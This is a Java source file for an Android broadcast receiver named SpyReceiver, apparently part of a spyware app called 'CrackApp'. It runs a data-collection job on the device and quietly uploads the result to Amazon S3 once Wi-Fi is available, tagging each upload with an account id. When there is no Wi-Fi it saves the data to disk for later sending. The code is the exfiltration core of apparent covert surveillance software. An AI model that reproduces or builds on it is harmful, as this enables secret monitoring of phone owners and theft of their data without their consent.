package co.poweramp.crackapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.loopj.android.http.AsyncHttpClient;

import java.util.LinkedList;
import java.util.Queue;

import co.poweramp.crackapp.Constants;
import co.poweramp.crackapp.R;
import co.poweramp.crackapp.S3Util;
import co.poweramp.crackapp.Util;
import cz.msebera.android.httpclient.Header;
import cz.msebera.android.httpclient.entity.StringEntity;

/**
 * CrackApp
 * <p/>
 * Created by duncan on 22/11/15.
 * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
 */
public class SpyReceiver extends BroadcastReceiver {
    private final String TAG = "SpyReceiver";

    @Override
    public void onReceive(final Context context, Intent intent) {
        SharedPreferences sharedPref = context.getSharedPreferences(context.getString(R.string.preference_account_id), Context.MODE_PRIVATE);
        final int accountId = sharedPref.getInt("accountId", -1);
        if (accountId == -1) {
            Log.d(TAG, "Account id is -1, ignored!");
            return;
        }
        final Handler handler = new Handler();
        Log.d(TAG, "Doing job");
        new Job(context, new Job.JobCompletionListener() {
            @Override
            public void onComplete(final Job j, Payload p) {
                ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                if (mWifi.isConnected()) {
                    //Wi-Fi available, start upload
                    S3Util.uploadJob(context, j, new S3Util.UploadCompletionListener() {
                        @Override
                        public void onSuccess(final Payload p) {
                            handler.post(new Runnable() {
                                @Override
                                public void run() {
                                    p.setAccountId(accountId);
                                    Util.submitPayload(context, p, new Util.PayloadSubmitListener() {
                                        @Override
                                        public void onSuccess() {
                                            j.cleanup();
                                        }

                                        @Override
                                        public void onFailure() {

                                        }
                                    });
                                }
                            });
                        }

                        @Override
                        public void onFailure() {
                            Log.d(TAG, "Job upload failure");
                        }
                    });
                } else {
                    //Wi-Fi unavailable, queue for later upload
                    Log.d(TAG, "Job collected data saved to disk. Other services will pick it up later.");
                }
            }

            @Override
            public void onFailure(Job j) {
                Log.d(TAG, "Job completion failure");
            }
        });


    }
}
